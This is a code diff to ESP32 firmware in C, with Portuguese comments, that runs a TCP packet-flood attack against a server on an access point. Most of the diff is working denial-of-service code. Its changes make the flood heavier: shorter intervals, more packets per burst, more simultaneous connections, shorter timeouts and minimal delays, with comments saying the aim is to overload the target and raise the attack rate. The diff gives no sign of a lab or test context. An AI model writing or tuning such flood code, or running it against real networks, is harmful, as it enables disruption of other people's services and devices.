@@ -21,11 +21,11 @@
 #define TCP_SERVER_PORT 3333
 
 // Configurações do ataque de flood
-#define FLOOD_INTERVAL_MS 10          // Intervalo muito pequeno (100 pacotes/seg)
-#define PACKETS_PER_BURST 10          // Mais pacotes TCP por rajada
+#define FLOOD_INTERVAL_MS 5           // Intervalo MUITO pequeno para gerar múltiplos pacotes por segundo
+#define PACKETS_PER_BURST 20          // MAIS pacotes TCP por rajada
 #define MAX_FLOOD_PACKETS 5000        // Máximo de pacotes para enviar
 #define LARGE_PACKET_SIZE 1024        // Tamanho de pacotes grandes
-#define TCP_CONNECTIONS_SIMULTANEOUS 5 // Conexões TCP simultâneas
+#define TCP_CONNECTIONS_SIMULTANEOUS 10 // MAIS conexões TCP simultâneas
 
 static const char *TAG = "PACKET_FLOOD";
 static EventGroupHandle_t s_wifi_event_group;
@@ -118,10 +118,10 @@ void execute_tcp_flood_burst(void)
             continue;
         }
         
-        // Configurar timeout baixo para conexões rápidas
+        // Configurar timeout MUITO baixo para conexões ultra-rápidas
         struct timeval timeout;
-        timeout.tv_sec = 1;
-        timeout.tv_usec = 0;
+        timeout.tv_sec = 0;
+        timeout.tv_usec = 500000; // 500ms
         setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof timeout);
         setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof timeout);
         
@@ -135,8 +135,7 @@ void execute_tcp_flood_burst(void)
                 ESP_LOGI(TAG, "TCP FLOOD #%d enviado (%d bytes) -> Servidor TCP do AP", 
                          packets_sent + i + 1, sent);
                 
-                // Tentar manter conexão aberta brevemente para consumir recursos
-                vTaskDelay(pdMS_TO_TICKS(50));
+                // NÃO aguardar - enviar e fechar rapidamente para sobrecarregar
             } else {
                 packets_failed++;
                 ESP_LOGD(TAG, "Falha no envio TCP #%d", packets_sent + i + 1);
@@ -148,8 +147,8 @@ void execute_tcp_flood_burst(void)
         
         close(sock);
         
-        // Pequeno delay entre conexões para não sobrecarregar o próprio ESP32
-        vTaskDelay(pdMS_TO_TICKS(5));
+        // Delay MÍNIMO entre conexões para maximizar taxa de ataque
+        vTaskDelay(pdMS_TO_TICKS(1));
     }
     
     packets_sent += PACKETS_PER_BURST;
